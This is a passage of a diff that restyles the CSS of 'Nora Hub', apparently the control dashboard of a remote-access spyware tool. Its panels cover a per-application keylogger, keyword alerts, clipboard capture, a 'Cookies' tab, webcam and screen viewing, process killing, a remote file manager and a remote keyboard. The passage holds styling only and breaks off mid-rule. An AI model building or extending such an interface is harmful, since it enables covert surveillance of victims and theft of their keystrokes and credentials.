@@ -5,288 +5,284 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Nora Hub</title>
 <style>
-  * { margin:0; padding:0; box-sizing:border-box; }
-  body { background:#0d0d0d; color:#e0e0e0; font-family:'Consolas',monospace; height:100vh; display:flex; flex-direction:column; overflow:hidden; }
+:root {
+  --bg:      #0b0d12;
+  --bg2:     #111520;
+  --bg3:     #161b27;
+  --border:  #1e2535;
+  --border2: #2a3148;
+  --accent:  #3b82f6;
+  --accent2: #1d4ed8;
+  --green:   #22c55e;
+  --red:     #ef4444;
+  --amber:   #f59e0b;
+  --text:    #e2e8f0;
+  --muted:   #94a3b8;
+  --dim:     #475569;
+  --purple:  #a78bfa;
+}
+* { margin:0; padding:0; box-sizing:border-box; }
+body { background:var(--bg); color:var(--text); font-family:'Segoe UI',system-ui,sans-serif; height:100vh; display:flex; flex-direction:column; overflow:hidden; }
 
-  #topbar { background:#1a1a1a; border-bottom:1px solid #2a2a2a; padding:8px 16px; display:flex; align-items:center; gap:12px; flex-shrink:0; flex-wrap:wrap; }
-  #topbar h1 { font-size:14px; color:#7c6aff; letter-spacing:2px; text-transform:uppercase; }
-  #status { font-size:12px; padding:3px 10px; border-radius:12px; background:#2a2a2a; }
-  #status.connected { color:#4ade80; }
-  #status.disconnected { color:#f87171; }
-  #fps-info { font-size:11px; color:#555; }
+/* ── Topbar ── */
+#topbar {
+  background:var(--bg2);
+  border-bottom:1px solid var(--border);
+  padding:0 14px;
+  height:46px;
+  display:flex;
+  align-items:center;
+  gap:10px;
+  flex-shrink:0;
+}
+#topbar h1 { font-size:15px; font-weight:700; color:var(--accent); letter-spacing:.5px; }
+#status {
+  font-size:11px; padding:3px 10px; border-radius:20px;
+  background:var(--bg3); border:1px solid var(--border); color:var(--dim);
+  display:flex; align-items:center; gap:5px;
+}
+#status::before { content:''; width:6px; height:6px; border-radius:50%; background:var(--dim); flex-shrink:0; }
+#status.connected { color:var(--green); border-color:#16532d; }
+#status.connected::before { background:var(--green); box-shadow:0 0 5px var(--green); }
+#status.disconnected { color:var(--red); border-color:#7f1d1d; }
+#status.disconnected::before { background:var(--red); }
+#fps-info { font-size:11px; color:var(--dim); }
+#agent-select {
+  background:var(--bg3); border:1px solid var(--border2); color:var(--text);
+  padding:4px 10px; border-radius:6px; font-family:inherit; font-size:12px; cursor:pointer;
+}
+#agent-select option { background:var(--bg2); }
+.topbar-btn {
+  padding:5px 13px; border-radius:6px; border:1px solid var(--border2);
+  font-size:12px; font-family:inherit; cursor:pointer; background:var(--bg3); color:var(--muted);
+  transition:all .15s; white-space:nowrap;
+}
+.topbar-btn:hover { background:var(--border2); color:var(--text); }
+.topbar-btn.active { background:#14532d; border-color:#166534; color:var(--green); }
+.topbar-btn.active:hover { background:#7f1d1d; border-color:#991b1b; color:#fca5a5; }
+#rec-btn { margin-left:auto; }
+#rec-btn:hover:not(.recording) { background:#7f1d1d; border-color:#991b1b; color:#fca5a5; }
+#rec-btn.recording { background:#7f1d1d; border-color:#ef4444; color:#fca5a5; animation:pulse 1.2s infinite; }
+#rec-timer { font-size:11px; color:var(--red); font-weight:600; display:none; }
+#rec-timer.visible { display:block; }
+@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.5} }
 
-  #agent-select { background:#1a1a1a; border:1px solid #333; color:#e0e0e0; padding:4px 10px; border-radius:6px; font-family:inherit; font-size:12px; cursor:pointer; }
-  #agent-select option { background:#1a1a1a; }
-  #no-agents { font-size:12px; color:#555; display:none; }
+/* ── Layout ── */
+#main { display:flex; flex:1; overflow:hidden; }
+#view-area { flex:1; display:flex; flex-direction:column; overflow:hidden; }
+#screen-panel { flex:1; display:flex; align-items:center; justify-content:center; background:#07090d; position:relative; overflow:hidden; }
+#screen { max-width:100%; max-height:100%; object-fit:contain; cursor:none; display:block; user-select:none; }
+#cursor { position:absolute; width:14px; height:14px; border:2px solid var(--accent); border-radius:50%; pointer-events:none; transform:translate(-50%,-50%); display:none; box-shadow:0 0 6px #3b82f666; }
 
-  .topbar-btn { padding:4px 14px; border-radius:6px; border:none; font-size:12px; font-family:inherit; cursor:pointer; letter-spacing:1px; transition:background .2s,color .2s; }
-  #cam-btn { background:#2a2a2a; color:#aaa; }
-  #cam-btn.active { background:#1a6640; color:#4ade80; }
-  #cam-btn:hover:not(.active) { background:#1a6640; color:#4ade80; }
-  #cam-btn.active:hover { background:#c0392b; color:#fff; }
-  #mic-btn { background:#2a2a2a; color:#aaa; }
-  #mic-btn.active { background:#1a3366; color:#60a5fa; animation:pulse 1.2s infinite; }
-  #mic-btn:hover:not(.active) { background:#1a3366; color:#60a5fa; }
-  #mic-btn.active:hover { background:#c0392b; color:#fff; }
-  #rec-btn { margin-left:auto; background:#2a2a2a; color:#aaa; }
-  #rec-btn:hover:not(.recording) { background:#c0392b; color:#fff; }
-  #rec-btn.recording { background:#c0392b; color:#fff; animation:pulse 1.2s infinite; }
-  #rec-timer { font-size:11px; color:#f87171; font-weight:bold; display:none; }
-  #rec-timer.visible { display:block; }
-  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.6} }
+#camera-panel { height:180px; background:#050709; border-top:1px solid var(--border); display:none; align-items:center; justify-content:center; flex-shrink:0; }
+#camera-panel.visible { display:flex; }
+#camera-feed { max-height:100%; max-width:100%; object-fit:contain; display:block; }
+#cam-placeholder { color:var(--dim); font-size:12px; }
 
-  #main { display:flex; flex:1; overflow:hidden; }
-  #view-area { flex:1; display:flex; flex-direction:column; overflow:hidden; }
+/* ── Sidebar ── */
+#sidebar { width:300px; background:var(--bg2); border-left:1px solid var(--border); display:flex; flex-direction:column; flex-shrink:0; }
+.tab-bar { display:flex; background:var(--bg); border-bottom:1px solid var(--border); flex-shrink:0; }
+.tab {
+  flex:1; padding:9px 4px; font-size:11px; text-align:center; cursor:pointer;
+  color:var(--dim); letter-spacing:.3px; border-bottom:2px solid transparent;
+  transition:color .15s; font-weight:500;
+}
+.tab.active { color:var(--accent); border-bottom-color:var(--accent); }
+.tab:hover:not(.active) { color:var(--muted); }
+.tab-panel { flex:1; display:none; flex-direction:column; overflow:hidden; }
+.tab-panel.active { display:flex; }
+.panel-header {
+  background:var(--bg); padding:7px 10px; font-size:10px; text-transform:uppercase;
+  letter-spacing:.8px; color:var(--muted); border-bottom:1px solid var(--border);
+  display:flex; justify-content:space-between; align-items:center; flex-shrink:0; gap:6px;
+  font-weight:600;
+}
+.hdr-btn {
+  background:none; border:1px solid var(--border2); color:var(--dim);
+  padding:2px 8px; border-radius:4px; font-size:10px; cursor:pointer;
+  font-family:inherit; white-space:nowrap; transition:all .15s;
+}
+.hdr-btn:hover { border-color:var(--accent); color:var(--accent); }
 
-  #screen-panel { flex:1; display:flex; align-items:center; justify-content:center; background:#080808; position:relative; overflow:hidden; }
-  #screen { max-width:100%; max-height:100%; object-fit:contain; cursor:none; display:block; user-select:none; }
-  #cursor { position:absolute; width:16px; height:16px; border:2px solid #7c6aff; border-radius:50%; pointer-events:none; transform:translate(-50%,-50%); display:none; }
+/* ── Keylog ── */
+#keylog { flex:1; overflow-y:auto; padding:8px; display:flex; flex-direction:column; gap:3px; }
+#keylog::-webkit-scrollbar { width:3px; }
+#keylog::-webkit-scrollbar-thumb { background:var(--border2); }
+.kl-app-header {
+  background:var(--bg3); border:1px solid var(--border2); border-left:3px solid var(--accent);
+  border-radius:4px; padding:5px 8px; font-size:10px; color:var(--muted);
+  display:flex; align-items:center; gap:6px; margin-top:6px; flex-shrink:0; font-weight:600;
+}
+.kl-app-name { flex:1; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; color:var(--text); }
+.kl-app-time { color:var(--dim); font-size:9px; flex-shrink:0; font-weight:400; }
+.kl-line {
+  background:var(--bg); border:1px solid var(--border); border-radius:4px;
+  padding:3px 7px; font-size:12px; display:flex; align-items:flex-start; gap:6px;
+  font-family:'Consolas',monospace;
+}
+.kl-ts { color:var(--dim); font-size:9px; flex-shrink:0; margin-top:2px; font-family:'Segoe UI',sans-serif; }
+.kl-chars { flex:1; word-break:break-all; color:var(--text); }
+.key-special { color:var(--purple); font-weight:600; }
+.key-backspace { color:var(--red); }
 
-  #camera-panel { height:200px; background:#050505; border-top:1px solid #222; display:none; align-items:center; justify-content:center; flex-shrink:0; }
-  #camera-panel.visible { display:flex; }
-  #camera-feed { max-height:100%; max-width:100%; object-fit:contain; display:block; }
-  #cam-placeholder { color:#333; font-size:12px; }
+/* ── Alert ── */
+#alert-section { border-top:1px solid var(--border); padding:8px 10px; flex-shrink:0; }
+#alert-section label { font-size:10px; color:var(--dim); text-transform:uppercase; letter-spacing:.5px; display:block; margin-bottom:5px; font-weight:600; }
+#alert-input-row { display:flex; gap:5px; }
+#alert-input { flex:1; background:var(--bg); border:1px solid var(--border2); color:var(--text); padding:4px 8px; border-radius:4px; font-family:inherit; font-size:11px; }
+#alert-add-btn { background:var(--bg3); border:1px solid var(--border2); color:var(--muted); padding:4px 10px; border-radius:4px; cursor:pointer; font-family:inherit; font-size:11px; transition:all .15s; }
+#alert-add-btn:hover { background:var(--accent); border-color:var(--accent); color:#fff; }
+#alert-tags { display:flex; flex-wrap:wrap; gap:4px; margin-top:5px; }
+.alert-tag { background:#1e3a5f; color:#60a5fa; font-size:10px; padding:2px 8px; border-radius:10px; cursor:pointer; border:1px solid #1d4ed8; }
+.alert-tag:hover { background:#7f1d1d; border-color:var(--red); color:#fca5a5; }
 
-  #sidebar { width:320px; background:#111; border-left:1px solid #222; display:flex; flex-direction:column; flex-shrink:0; }
+/* ── Clipboard ── */
+#clipboard-list { flex:1; overflow-y:auto; padding:8px; display:flex; flex-direction:column; gap:5px; }
+#clipboard-list::-webkit-scrollbar { width:3px; }
+#clipboard-list::-webkit-scrollbar-thumb { background:var(--border2); }
+.clip-item { background:var(--bg); border:1px solid var(--border); border-radius:6px; padding:7px 10px; font-size:11px; color:var(--text); word-break:break-all; cursor:pointer; transition:border-color .15s; }
+.clip-item:hover { border-color:var(--accent); }
+.clip-time { font-size:9px; color:var(--dim); margin-bottom:3px; }
+.clip-text { white-space:pre-wrap; max-height:70px; overflow:hidden; }
 
-  .tab-bar { display:flex; background:#1a1a1a; border-bottom:1px solid #2a2a2a; flex-shrink:0; }
-  .tab { flex:1; padding:8px 4px; font-size:11px; text-align:center; cursor:pointer; color:#555; letter-spacing:.5px; text-transform:uppercase; border-bottom:2px solid transparent; transition:color .2s; }
-  .tab.active { color:#7c6aff; border-bottom-color:#7c6aff; }
-  .tab:hover:not(.active) { color:#aaa; }
+/* ── Processes ── */
+#proc-controls { display:flex; gap:6px; padding:7px 10px; border-bottom:1px solid var(--border); flex-shrink:0; align-items:center; }
+#proc-search { flex:1; background:var(--bg); border:1px solid var(--border2); color:var(--text); padding:4px 8px; border-radius:4px; font-family:inherit; font-size:11px; }
+#proc-refresh { background:var(--bg3); border:1px solid var(--border2); color:var(--muted); padding:4px 12px; border-radius:4px; cursor:pointer; font-size:11px; font-family:inherit; transition:all .15s; }
+#proc-refresh:hover { background:var(--accent); border-color:var(--accent); color:#fff; }
+#proc-list { flex:1; overflow-y:auto; font-size:11px; }
+#proc-list::-webkit-scrollbar { width:3px; }
+#proc-list::-webkit-scrollbar-thumb { background:var(--border2); }
+.proc-row { display:grid; grid-template-columns:1fr 46px 58px 34px; gap:4px; align-items:center; padding:5px 10px; border-bottom:1px solid var(--border); }
+.proc-row:hover { background:var(--bg3); }
+.proc-name { white-space:nowrap; overflow:hidden; text-overflow:ellipsis; color:var(--text); }
+.proc-cpu { text-align:right; color:var(--amber); font-size:10px; font-family:monospace; }
+.proc-mem { text-align:right; color:var(--accent); font-size:10px; font-family:monospace; }
+.proc-kill { background:#3a1a1a; border:1px solid #7f1d1d; color:var(--red); padding:2px 5px; border-radius:3px; cursor:pointer; font-size:10px; font-family:inherit; transition:all .15s; }
+.proc-kill:hover { background:var(--red); color:#fff; }
+.proc-header { display:grid; grid-template-columns:1fr 46px 58px 34px; gap:4px; padding:5px 10px; font-size:10px; color:var(--dim); border-bottom:1px solid var(--border2); text-transform:uppercase; flex-shrink:0; letter-spacing:.5px; }
 
-  .tab-panel { flex:1; display:none; flex-direction:column; overflow:hidden; }
-  .tab-panel.active { display:flex; }
+/* ── Control panel ── */
+#control-panel { border-top:1px solid var(--border); padding:10px 12px; font-size:11px; color:var(--dim); flex-shrink:0; }
+#control-panel label { display:flex; align-items:center; gap:8px; cursor:pointer; color:var(--muted); }
+#control-panel input[type=checkbox] { accent-color:var(--accent); }
+.hotkey-hint { font-size:10px; color:var(--dim); margin-top:4px; }
+#kbd-toggle-btn { margin-top:8px; background:var(--bg3); border:1px solid var(--border2); color:var(--muted); padding:5px 12px; border-radius:5px; cursor:pointer; font-size:11px; font-family:inherit; transition:all .15s; }
+#kbd-toggle-btn:hover { background:var(--border2); color:var(--text); }
 
-  .panel-header { background:#1a1a1a; padding:7px 10px; font-size:10px; text-transform:uppercase; letter-spacing:1px; color:#7c6aff; border-bottom:1px solid #2a2a2a; display:flex; justify-content:space-between; align-items:center; flex-shrink:0; gap:6px; }
-  #keylog { flex:1; overflow-y:auto; padding:8px; font-size:12px; line-height:1.6; word-break:break-all; color:#ccc; display:flex; flex-direction:column; gap:4px; }
-  #keylog::-webkit-scrollbar { width:4px; }
-  #keylog::-webkit-scrollbar-thumb { background:#333; }
-  .kl-app-header { background:#1a1730; border:1px solid #2d2650; border-radius:6px; padding:5px 9px; font-size:10px; color:#a78bfa; letter-spacing:.5px; display:flex; align-items:center; gap:6px; margin-top:4px; flex-shrink:0; }
-  .kl-app-icon { font-size:11px; }
-  .kl-app-name { font-weight:bold; flex:1; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
-  .kl-app-time { color:#555; font-size:9px; flex-shrink:0; }
-  .kl-line { background:#0d0d0d; border-radius:4px; padding:3px 7px; font-size:12px; display:flex; align-items:flex-start; gap:6px; min-height:22px; }
-  .kl-ts { color:#444; font-size:9px; flex-shrink:0; margin-top:2px; }
-  .kl-chars { flex:1; word-break:break-all; }
-  .key-special { color:#7c6aff; font-weight:bold; }
-  .key-backspace { color:#f87171; }
-  .hdr-btn { background:none; border:1px solid #333; color:#666; padding:2px 7px; border-radius:4px; font-size:10px; cursor:pointer; font-family:inherit; white-space:nowrap; }
-  .hdr-btn:hover { border-color:#7c6aff; color:#7c6aff; }
+#desktop-controls { display:flex; gap:5px; margin-top:8px; flex-wrap:wrap; align-items:center; }
+.desk-btn { background:var(--bg3); border:1px solid var(--border2); color:var(--muted); padding:4px 10px; border-radius:5px; cursor:pointer; font-size:11px; font-family:inherit; transition:all .15s; }
+.desk-btn:hover { background:var(--border2); color:var(--text); }
+#win-picker { margin-top:7px; }
+#win-picker-btn { background:var(--bg3); border:1px solid #14532d; color:var(--green); padding:4px 10px; border-radius:5px; cursor:pointer; font-size:11px; font-family:inherit; transition:all .15s; }
+#win-picker-btn:hover { background:#14532d; }
+#win-target-label { font-size:10px; color:var(--green); margin-top:4px; word-break:break-all; display:none; }
+#win-stream-badge { display:none; font-size:10px; color:var(--green); margin-top:3px; }
+#win-stream-stop { background:#3a1a1a; border:none; color:var(--red); padding:2px 7px; border-radius:4px; cursor:pointer; font-size:10px; font-family:inherit; }
 
-  #alert-section { border-top:1px solid #222; padding:8px 10px; flex-shrink:0; }
-  #alert-section label { font-size:10px; color:#555; text-transform:uppercase; letter-spacing:.5px; display:block; margin-bottom:5px; }
-  #alert-input-row { display:flex; gap:5px; }
-  #alert-input { flex:1; background:#0d0d0d; border:1px solid #333; color:#ccc; padding:4px 7px; border-radius:4px; font-family:inherit; font-size:11px; }
-  #alert-add-btn { background:#2a2a2a; border:none; color:#aaa; padding:4px 9px; border-radius:4px; cursor:pointer; font-family:inherit; font-size:11px; }
-  #alert-add-btn:hover { background:#7c6aff; color:#fff; }
-  #alert-tags { display:flex; flex-wrap:wrap; gap:4px; margin-top:5px; }
-  .alert-tag { background:#1e1a3a; color:#7c6aff; font-size:10px; padding:2px 7px; border-radius:10px; cursor:pointer; }
-  .alert-tag:hover { background:#c0392b; color:#fff; }
+/* ── File Manager ── */
+#fm-path-bar { display:flex; align-items:center; gap:5px; padding:6px 8px; background:var(--bg); border-bottom:1px solid var(--border); flex-shrink:0; flex-wrap:wrap; }
+#fm-breadcrumb { flex:1; min-width:0; font-size:11px; color:var(--muted); word-break:break-all; }
+#fm-up-btn { background:var(--bg3); border:1px solid var(--border2); color:var(--muted); padding:3px 9px; border-radius:4px; cursor:pointer; font-size:11px; font-family:inherit; flex-shrink:0; transition:all .15s; }
+#fm-up-btn:hover { background:var(--accent); border-color:var(--accent); color:#fff; }
+#fm-upload-btn { background:var(--bg3); border:1px solid #14532d; color:var(--green); padding:3px 9px; border-radius:4px; cursor:pointer; font-size:11px; font-family:inherit; flex-shrink:0; transition:all .15s; }
+#fm-upload-btn:hover { background:#14532d; }
+#fm-list { flex:1; overflow-y:auto; }
+#fm-list::-webkit-scrollbar { width:3px; }
+#fm-list::-webkit-scrollbar-thumb { background:var(--border2); }
+.fm-row { display:flex; align-items:center; gap:8px; padding:6px 10px; border-bottom:1px solid var(--border); cursor:pointer; font-size:11px; transition:background .1s; }
+.fm-row:hover { background:var(--bg3); }
+.fm-icon { font-size:13px; flex-shrink:0; }
+.fm-name { flex:1; min-width:0; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; color:var(--text); }
+.fm-meta { font-size:10px; color:var(--dim); flex-shrink:0; white-space:nowrap; font-family:monospace; }
+.fm-actions { display:flex; gap:4px; flex-shrink:0; }
+.fm-dl-btn { background:#1e3a5f; border:none; color:#60a5fa; padding:2px 6px; border-radius:3px; cursor:pointer; font-size:10px; font-family:inherit; }
+.fm-dl-btn:hover { background:var(--accent); color:#fff; }
+.fm-del-btn { background:#3a1a1a; border:none; color:var(--red); padding:2px 6px; border-radius:3px; cursor:pointer; font-size:10px; font-family:inherit; }
+.fm-del-btn:hover { background:var(--red); color:#fff; }
+#fm-status { font-size:10px; color:var(--dim); padding:10px; text-align:center; }
 
-  #clipboard-list { flex:1; overflow-y:auto; padding:8px; display:flex; flex-direction:column; gap:6px; }
-  #clipboard-list::-webkit-scrollbar { width:4px; }
-  #clipboard-list::-webkit-scrollbar-thumb { background:#333; }
-  .clip-item { background:#0d0d0d; border:1px solid #222; border-radius:5px; padding:7px 9px; font-size:11px; color:#ccc; word-break:break-all; position:relative; cursor:pointer; }
-  .clip-item:hover { border-color:#7c6aff; }
-  .clip-time { font-size:9px; color:#444; margin-bottom:3px; }
-  .clip-text { white-space:pre-wrap; max-height:80px; overflow:hidden; }
+/* ── Cookies ── */
+#tab-cookies { padding:12px; }
+.ck-note { font-size:11px; color:var(--dim); line-height:1.6; margin-bottom:10px; }
+.ck-btn { width:100%; padding:8px; border-radius:6px; border:1px solid var(--border2); background:var(--bg3); color:var(--muted); font-family:inherit; font-size:12px; cursor:pointer; transition:all .15s; margin-bottom:6px; }
+.ck-btn:hover { background:var(--accent); border-color:var(--accent); color:#fff; }
+.ck-status { font-size:10px; color:var(--dim); min-height:14px; }
+.ck-divider { border:none; border-top:1px solid var(--border); margin:10px 0; }
 
-  #proc-controls { display:flex; gap:6px; padding:7px 10px; border-bottom:1px solid #222; flex-shrink:0; align-items:center; }
-  #proc-search { flex:1; background:#0d0d0d; border:1px solid #333; color:#ccc; padding:4px 8px; border-radius:4px; font-family:inherit; font-size:11px; }
-  #proc-refresh { background:#2a2a2a; border:none; color:#aaa; padding:4px 10px; border-radius:4px; cursor:pointer; font-size:11px; font-family:inherit; }
-  #proc-refresh:hover { background:#7c6aff; color:#fff; }
-  #proc-list { flex:1; overflow-y:auto; font-size:11px; }
-  #proc-list::-webkit-scrollbar { width:4px; }
-  #proc-list::-webkit-scrollbar-thumb { background:#333; }
-  .proc-row { display:grid; grid-template-columns:1fr 50px 60px 36px; gap:4px; align-items:center; padding:5px 10px; border-bottom:1px solid #1a1a1a; }
-  .proc-row:hover { background:#151515; }
-  .proc-name { white-space:nowrap; overflow:hidden; text-overflow:ellipsis; color:#ddd; }
-  .proc-cpu { text-align:right; color:#f59e0b; font-size:10px; }
-  .proc-mem { text-align:right; color:#60a5fa; font-size:10px; }
-  .proc-kill { background:#3a1a1a; border:none; color:#f87171; padding:2px 5px; border-radius:3px; cursor:pointer; font-size:10px; font-family:inherit; }
-  .proc-kill:hover { background:#c0392b; color:#fff; }
-  .proc-header { display:grid; grid-template-columns:1fr 50px 60px 36px; gap:4px; padding:5px 10px; font-size:10px; color:#444; border-bottom:1px solid #2a2a2a; text-transform:uppercase; flex-shrink:0; }
+/* ── Window modal ── */
+#win-modal { display:none; position:fixed; z-index:1000; inset:0; background:#00000099; }
+#win-modal-box { position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); background:var(--bg2); border:1px solid var(--border2); border-radius:10px; width:380px; max-height:60vh; display:flex; flex-direction:column; font-family:inherit; }
+#win-modal-title { padding:10px 14px; background:var(--bg); border-radius:10px 10px 0 0; font-size:12px; color:var(--muted); display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid var(--border); }
+#win-modal-close { background:none; border:none; color:var(--dim); font-size:16px; cursor:pointer; }
+#win-modal-close:hover { color:var(--red); }
+#win-list { overflow-y:auto; flex:1; }
+#win-list::-webkit-scrollbar { width:3px; }
+#win-list::-webkit-scrollbar-thumb { background:var(--border2); }
+.win-row { padding:8px 14px; cursor:pointer; font-size:11px; color:var(--muted); border-bottom:1px solid var(--border); display:flex; align-items:center; gap:8px; }
+.win-row:hover { background:var(--bg3); color:var(--text); }
+.win-row.selected { background:#1e3a5f; color:#60a5fa; }
+.win-hwnd { font-size:9px; color:var(--dim); flex-shrink:0; }
+#win-clear-btn { margin:8px 14px; background:#3a1a1a; border:none; color:var(--red); padding:4px 10px; border-radius:5px; cursor:pointer; font-size:11px; font-family:inherit; }
+.win-stream-btn { background:#14532d; border:none; color:var(--green); padding:2px 7px; border-radius:4px; cursor:pointer; font-size:10px; font-family:inherit; flex-shrink:0; margin-left:4px; }
 
-  #control-panel { border-top:1px solid #222; padding:10px 12px; font-size:11px; color:#666; flex-shrink:0; }
-  #control-panel label { display:flex; align-items:center; gap:8px; cursor:pointer; }
-  #control-panel input[type=checkbox] { accent-color:#7c6aff; }
-  .hotkey-hint { font-size:10px; color:#444; margin-top:5px; }
+/* ── Remote Keyboard ── */
+#kbd-window { display:none; position:fixed; z-index:999; background:var(--bg2); border:1px solid var(--border2); border-radius:10px; box-shadow:0 8px 32px #00000080; width:300px; font-family:inherit; user-select:none; left:50%; top:50%; transform:translate(-50%,-50%); }
+#kbd-titlebar { display:flex; align-items:center; padding:9px 12px; background:var(--bg); border-radius:10px 10px 0 0; cursor:grab; gap:8px; border-bottom:1px solid var(--border); }
+#kbd-titlebar:active { cursor:grabbing; }
+#kbd-title { flex:1; font-size:12px; color:var(--muted); letter-spacing:.5px; }
+#kbd-close { background:none; border:none; color:var(--dim); font-size:16px; cursor:pointer; padding:0; line-height:1; }
+#kbd-close:hover { color:var(--red); }
+#kbd-indicator { display:flex; align-items:center; gap:6px; padding:8px 12px; font-size:11px; color:var(--dim); border-bottom:1px solid var(--border); }
+#kbd-dot { width:6px; height:6px; border-radius:50%; background:var(--dim); flex-shrink:0; transition:background .1s; }
+#kbd-dot.active { background:var(--green); box-shadow:0 0 5px var(--green); }
+#kbd-last { flex:1; color:var(--accent); font-size:11px; min-height:14px; }
+#kbd-box { width:100%; box-sizing:border-box; padding:10px 12px; background:var(--bg); border:none; border-radius:0 0 10px 10px; color:var(--text); font-family:'Consolas',monospace; font-size:13px; resize:none; outline:none; height:80px; caret-color:var(--accent); }
+#kbd-box::placeholder { color:var(--dim); }
+#kbd-hint { padding:5px 12px 9px; font-size:10px; color:var(--dim); text-align:center; }
 
-  /* ── File Manager ──────────────────────────────────────────────────────── */
-  #fm-path-bar { display:flex; align-items:center; gap:5px; padding:6px 8px; background:#1a1a1a; border-bottom:1px solid #2a2a2a; flex-shrink:0; flex-wrap:wrap; }
-  #fm-path-bar span { font-size:10px; color:#7c6aff; }
-  #fm-breadcrumb { flex:1; min-width:0; font-size:11px; color:#aaa; word-break:break-all; }
-  #fm-up-btn { background:#2a2a2a; border:none; color:#aaa; padding:3px 9px; border-radius:4px; cursor:pointer; font-size:12px; font-family:inherit; flex-shrink:0; }
-  #fm-up-btn:hover { background:#7c6aff; color:#fff; }
-  #fm-upload-btn { background:#2a2a2a; border:none; color:#aaa; padding:3px 9px; border-radius:4px; cursor:pointer; font-size:11px; font-family:inherit; flex-shrink:0; }
-  #fm-upload-btn:hover { background:#1a6640; color:#4ade80; }
+/* ── Sidebar handle (mobile) ── */
+#sidebar-handle { display:none; }
 
-  #fm-list { flex:1; overflow-y:auto; }
-  #fm-list::-webkit-scrollbar { width:4px; }
-  #fm-list::-webkit-scrollbar-thumb { background:#333; }
-  .fm-row { display:flex; align-items:center; gap:8px; padding:6px 10px; border-bottom:1px solid #1a1a1a; cursor:pointer; font-size:11px; }
-  .fm-row:hover { background:#151515; }
-  .fm-icon { font-size:13px; flex-shrink:0; }
-  .fm-name { flex:1; min-width:0; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; color:#ddd; }
-  .fm-meta { font-size:10px; color:#555; flex-shrink:0; white-space:nowrap; }
-  .fm-actions { display:flex; gap:4px; flex-shrink:0; }
-  .fm-dl-btn { background:#1a2a3a; border:none; color:#60a5fa; padding:2px 6px; border-radius:3px; cursor:pointer; font-size:10px; font-family:inherit; }
-  .fm-dl-btn:hover { background:#2563eb; color:#fff; }
-  .fm-del-btn { background:#3a1a1a; border:none; color:#f87171; padding:2px 6px; border-radius:3px; cursor:pointer; font-size:10px; font-family:inherit; }
-  .fm-del-btn:hover { background:#c0392b; color:#fff; }
-  #fm-status { font-size:10px; color:#555; padding:5px 10px; text-align:center; flex-shrink:0; }
-
-  /* ── Desktop & window controls ─────────────────────────────────────────── */
-  #desktop-controls { display:flex; gap:5px; margin-top:7px; flex-wrap:wrap; align-items:center; }
-  .desk-btn { background:#1a1a2a; border:1px solid #2a2a4a; color:#a78bfa; padding:3px 9px; border-radius:5px; cursor:pointer; font-size:11px; font-family:Consolas,monospace; white-space:nowrap; }
-  .desk-btn:hover { background:#2d2650; color:#fff; }
-  #win-picker { margin-top:7px; }
-  #win-picker-btn { background:#1a2a1a; border:1px solid #2a4a2a; color:#4ade80; padding:3px 9px; border-radius:5px; cursor:pointer; font-size:11px; font-family:Consolas,monospace; }
-  #win-picker-btn:hover { background:#1e3a1e; }
-  #win-target-label { font-size:10px; color:#4ade80; margin-top:4px; word-break:break-all; display:none; }
-  #win-target-label span { color:#555; }
-
-  #win-modal { display:none; position:fixed; z-index:1000; inset:0; background:#000a; }
-  #win-modal-box { position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); background:#111; border:1px solid #333; border-radius:10px; width:380px; max-height:60vh; display:flex; flex-direction:column; font-family:Consolas,monospace; }
-  #win-modal-title { padding:10px 14px; background:#1a1a1a; border-radius:10px 10px 0 0; font-size:12px; color:#aaa; display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #222; }
-  #win-modal-close { background:none; border:none; color:#555; font-size:16px; cursor:pointer; }
-  #win-modal-close:hover { color:#f87171; }
-  #win-list { overflow-y:auto; flex:1; }
-  #win-list::-webkit-scrollbar { width:4px; }
-  #win-list::-webkit-scrollbar-thumb { background:#333; }
-  .win-row { padding:8px 14px; cursor:pointer; font-size:11px; color:#ccc; border-bottom:1px solid #1a1a1a; display:flex; align-items:center; gap:8px; }
-  .win-row:hover { background:#1e1e1e; color:#fff; }
-  .win-row.selected { background:#1a2a1a; color:#4ade80; }
-  .win-hwnd { font-size:9px; color:#444; flex-shrink:0; }
-  #win-clear-btn { margin:8px 14px; background:#2a1a1a; border:none; color:#f87171; padding:4px 10px; border-radius:5px; cursor:pointer; font-size:11px; font-family:Consolas,monospace; }
-  #win-clear-btn:hover { background:#3a1a1a; }
-  .win-stream-btn { background:#1a3a2a; border:none; color:#4ade80; padding:2px 7px; border-radius:4px; cursor:pointer; font-size:10px; font-family:Consolas,monospace; flex-shrink:0; margin-left:4px; }
-  .win-stream-btn:hover { background:#1e4a30; }
-  #win-stream-badge { display:none; font-size:10px; color:#4ade80; margin-top:3px; }
-  #win-stream-stop { background:#3a1a1a; border:none; color:#f87171; padding:2px 7px; border-radius:4px; cursor:pointer; font-size:10px; font-family:Consolas,monospace; }
-  #win-stream-stop:hover { background:#4a2020; }
-
-  /* ── Remote Keyboard window ─────────────────────────────────────────────── */
-  #kbd-window {
-    display:none; position:fixed; z-index:999;
-    background:#111; border:1px solid #333; border-radius:10px;
-    box-shadow:0 8px 32px #000a; width:320px;
-    font-family:Consolas,monospace; user-select:none;
-    left:50%; top:50%; transform:translate(-50%,-50%);
-  }
-  #kbd-titlebar {
-    display:flex; align-items:center; padding:9px 12px;
-    background:#1a1a1a; border-radius:10px 10px 0 0;
-    cursor:grab; gap:8px; border-bottom:1px solid #222;
-  }
-  #kbd-titlebar:active { cursor:grabbing; }
-  #kbd-title { flex:1; font-size:12px; color:#aaa; letter-spacing:1px; }
-  #kbd-close { background:none; border:none; color:#555; font-size:16px; cursor:pointer; padding:0; line-height:1; }
-  #kbd-close:hover { color:#f87171; }
-  #kbd-indicator {
-    display:flex; align-items:center; gap:6px; padding:8px 12px;
-    font-size:11px; color:#555; border-bottom:1px solid #1a1a1a;
-  }
-  #kbd-dot { width:7px; height:7px; border-radius:50%; background:#333; flex-shrink:0; transition:background .1s; }
-  #kbd-dot.active { background:#4ade80; box-shadow:0 0 6px #4ade8099; }
-  #kbd-last { flex:1; color:#7c6aff; font-size:11px; min-height:14px; }
-  #kbd-box {
